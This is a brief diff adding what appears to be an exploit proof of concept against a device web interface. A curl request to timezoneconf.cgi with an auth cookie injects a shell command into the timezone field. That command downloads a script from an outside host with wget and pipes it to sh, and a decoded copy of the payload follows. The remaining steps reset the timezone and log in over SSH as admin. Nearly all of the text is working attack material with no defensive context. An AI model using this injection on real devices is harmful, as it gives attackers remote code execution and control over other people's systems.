@@ -1,0 +1,12 @@
+#1:
+curl 'http://<IP>/timezoneconf.cgi' \
+  -b 'auth=ff0000ff4813494d137e1631bba301d5' \
+  --data-raw 'timezone=%3Bwget%20http%3A%2F%2Fxn--i29h.ge%2Fn.sh%20-O-%7Csh%3B'
+
+NOTE: --data-raw 'timezone=;wget http://xn--i29h.ge/n.sh -O- | sh;'
+
+#2:
+Reset Timezone in web interface!
+
+#3:
+ssh admin@<IP>
